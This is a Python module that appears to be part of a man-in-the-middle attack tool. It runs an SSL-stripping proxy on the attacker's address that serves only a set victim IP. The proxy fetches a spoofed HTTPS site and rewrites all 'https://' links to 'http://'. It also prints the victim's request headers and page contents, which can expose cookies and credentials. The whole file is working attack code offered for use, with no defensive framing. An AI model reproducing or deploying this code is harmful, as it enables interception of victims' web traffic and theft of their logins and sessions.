from logger import log_info, log_warning
import http.client
import http.server
import socketserver
import requests

site_to_spoof = None
ip_victim = None
ip_attacker = None

# Custom HTTP request handler that only allows requests from the victim.
class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        self.s = requests.Session()
        self.s.max_redirects = 30
        super().__init__(*args, **kwargs)

    def do_GET(self):
        # Get the client's IP address
        client_ip = self.client_address[0]
        
        # Check if the client's IP address matches the allowed IP
        if client_ip == ip_victim:
            # Print request path and headers
            print("Received GET request")

            # Remove the Upgrade-Insecure-Requests header
            new_headers = {key: value for key, value in self.headers.items()}
            new_headers.pop("Upgrade-Insecure-Requests", None)

            print("Path:", self.path)
            print("Headers:", new_headers)
            print("FULL URL: ", "https://" + site_to_spoof + self.path)

            response = self.s.get("https://" + site_to_spoof + self.path, headers=new_headers)

            # Replace all "https://" with "http://"
            try:
                response_content = response.content.decode('utf-8').replace("https://", "http://").encode('utf-8')
                print(response.content.decode('utf-8'))
            except UnicodeDecodeError:
                response_content = response.content.replace(b"https://", b"http://")

            # Send the response back to the client
            self.send_response(response.status_code)
            # copy headers from the response
            # for header, value in response.headers.items():
            #     # Replace https with http in the headers.
            #     value = value.replace("https://", "http://")
            #     self.send_header(header, value)
            #     print("Key:", header, "Value:", value)

            self.end_headers()
            self.wfile.write(response_content)
        else:
            # Send a 403 Forbidden response
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b'403 Forbidden: Access denied')

class Forwarder:
    def __init__(self, interface, ip_attacker_, ip_victim_, site_to_spoof_):
        global ip_victim, site_to_spoof, ip_attacker
        self.interface = interface
        ip_attacker = ip_attacker_
        ip_victim = ip_victim_
        site_to_spoof = site_to_spoof_

    def forward(self):
        log_info("Starting packet forwarding")

        # Start listening for HTTP requests from the victim
        log_info("Starting HTTP server")
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer((ip_attacker, 80), CustomHTTPRequestHandler)
        httpd.serve_forever()

        log_warning("Stopping packet forwarding")
